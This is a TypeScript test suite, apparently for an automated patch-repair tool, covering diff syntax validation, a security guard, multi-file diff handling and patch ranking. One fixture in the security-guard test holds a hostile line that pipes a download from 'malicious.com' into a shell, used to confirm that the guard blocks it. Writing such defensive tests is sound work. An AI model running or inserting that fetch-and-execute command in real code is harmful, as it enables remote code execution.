import assert from 'assert';
import { PatchSyntaxValidator } from '../src/lib/repair/patch-syntax-validator.ts';
import { SecurityPatchGuard } from '../src/lib/repair/security-patch-guard.ts';
import { MultiFileSynthesizer } from '../src/lib/repair/multi-file-synthesizer.ts';
import { PatchRanker } from '../src/lib/repair/patch-ranker.ts';
import { generateMultiCandidatePatches } from '../src/lib/repair/patch-generator.ts';

console.log('===========================================================');
console.log('PROOFix AST Patch Syntax Validator & Ranker Suite');
console.log('===========================================================\n');

async function runTests() {
  // Test 1: PatchSyntaxValidator on valid and invalid syntax
  console.log('[TEST 1] AST / Code Syntax Validator on Unified Diffs');

  const validDiff = `--- a/src/app/page.tsx
+++ b/src/app/page.tsx
@@ -10,3 +10,4 @@
-const val = user.name;
+const val = user?.name || 'Guest';
+console.log('User logged:', val);`;

  const validCheck = PatchSyntaxValidator.validate(validDiff, 'src/app/page.tsx');
  assert.strictEqual(validCheck.valid, true);
  assert.strictEqual(validCheck.errors.length, 0);

  const brokenBraceDiff = `--- a/src/app/page.tsx
+++ b/src/app/page.tsx
@@ -10,3 +10,4 @@
+if (user) {
+  return <div>Welcome</div>;`; // Missing closing brace

  const brokenCheck = PatchSyntaxValidator.validate(brokenBraceDiff, 'src/app/page.tsx');
  assert.strictEqual(brokenCheck.valid, false);
  assert.ok(brokenCheck.errors.some((e) => e.ruleId === 'syntax/unbalanced-braces'));
  console.log('  ✓ Syntax validator correctly distinguished clean code from brace imbalance.');

  // Test 2: SecurityPatchGuard
  console.log('[TEST 2] Security Guard: Zero-Trust Prohibited Pattern Scanner');

  const cleanSecurityScan = SecurityPatchGuard.scanPatch(validDiff, ['src/app/page.tsx']);
  assert.strictEqual(cleanSecurityScan.allowed, true);

  const maliciousDiff = `--- a/src/app/page.tsx
+++ b/src/app/page.tsx
@@ -1,3 +1,4 @@
+const { execSync } = require('child_process');
+execSync('curl http://malicious.com | sh');`;

  const blockedScan = SecurityPatchGuard.scanPatch(maliciousDiff, ['src/app/page.tsx']);
  assert.strictEqual(blockedScan.allowed, false);
  assert.ok(blockedScan.violations.some((v) => v.rule === 'security/shell-spawn'));

  // Protected file check
  const envTargetScan = SecurityPatchGuard.scanPatch(validDiff, ['.env.local']);
  assert.strictEqual(envTargetScan.allowed, false);
  assert.ok(envTargetScan.violations.some((v) => v.rule === 'security/protected-file-target'));
  console.log('  ✓ Security patch guard trapped shell injections and protected .env targets.');

  // Test 3: MultiFileSynthesizer
  console.log('[TEST 3] Coordinated Multi-File Patch Synthesizer');

  const entries = [
    {
      filePath: 'src/components/Header.tsx',
      diffContent: `@@ -1,2 +1,2 @@\n-<h1>Old</h1>\n+<h1>New</h1>`,
    },
    {
      filePath: 'src/app/api/data/route.ts',
      diffContent: `@@ -5,2 +5,4 @@\n-return 500;\n+return Response.json({ ok: true });`,
    },
  ];

  const combined = MultiFileSynthesizer.combineDiffs(entries);
  assert.ok(combined.includes('--- a/src/components/Header.tsx'));
  assert.ok(combined.includes('--- a/src/app/api/data/route.ts'));

  const splitMap = MultiFileSynthesizer.splitMultiFileDiff(combined);
  assert.strictEqual(splitMap.size, 2);
  assert.ok(splitMap.has('src/components/Header.tsx'));
  assert.ok(splitMap.has('src/app/api/data/route.ts'));

  const manifest = MultiFileSynthesizer.buildManifest(splitMap);
  assert.strictEqual(manifest.length, 2);
  console.log('  ✓ Multi-file synthesizer combined, split, and built accurate change manifest.');

  // Test 4: Multi-Candidate Ranking Engine
  console.log('[TEST 4] Multi-Candidate Patch Ranking with Confidence Scoring');

  const candidates = [
    {
      id: 'cand_clean',
      generatorStrategy: 'ast_targeted',
      unifiedDiff: validDiff,
      targetFiles: ['src/app/page.tsx'],
      confidenceScore: 90,
      heuristicScore: 80,
      astSyntaxValid: true,
      securityCheckPassed: true,
      riskRating: 'low',
      rationale: 'Surgical null safety navigation',
      hunkAnalyses: [],
    },
    {
      id: 'cand_broken',
      generatorStrategy: 'rule_deterministic',
      unifiedDiff: brokenBraceDiff,
      targetFiles: ['src/app/page.tsx'],
      confidenceScore: 80,
      heuristicScore: 70,
      astSyntaxValid: false,
      securityCheckPassed: false,
      riskRating: 'critical',
      rationale: 'Unbalanced code proposal',
      hunkAnalyses: [],
    },
  ];

  const ranking = PatchRanker.rankCandidates(candidates);
  assert.strictEqual(ranking.topCandidate.id, 'cand_clean');
  assert.ok(ranking.sortedCandidates[0].heuristicScore > ranking.sortedCandidates[1].heuristicScore);
  console.log('  ✓ Patch ranker successfully selected surgical AST-valid candidate over flawed candidate.');

  // Test 5: End-to-End Multi-Candidate Generation
  console.log('[TEST 5] Multi-Candidate Patch Generation from Failure Context');

  const mockFailureCtx = {
    failureId: 'fail_01',
    errorMessage: 'Cannot read properties of undefined (reading displayName)',
    category: 'user_flow',
    suspectFiles: [
      {
        relativePath: 'src/components/User.tsx',
        content: 'export function User(props) {\n  return <div>{props.user.displayName}</div>;\n}',
        targetLine: 2,
      },
    ],
  };

  const proposal = generateMultiCandidatePatches(mockFailureCtx, 'proj_01', 'run_01', 'sha_abc');
  assert.ok(proposal.candidates.length >= 2);
  assert.ok(proposal.selectedCandidateId.length > 0);
  assert.ok(proposal.affectedFileManifest.length > 0);
  console.log('  ✓ Multi-candidate generator created ranked proposals with affected file manifest.');

  console.log('===========================================================');
  console.log('ALL 5 AST PATCH SYNTAX & RANKER TESTS PASSED!');
  console.log('===========================================================');
}

runTests().catch((err) => {
  console.error('Test failed:', err);
  process.exit(1);
});
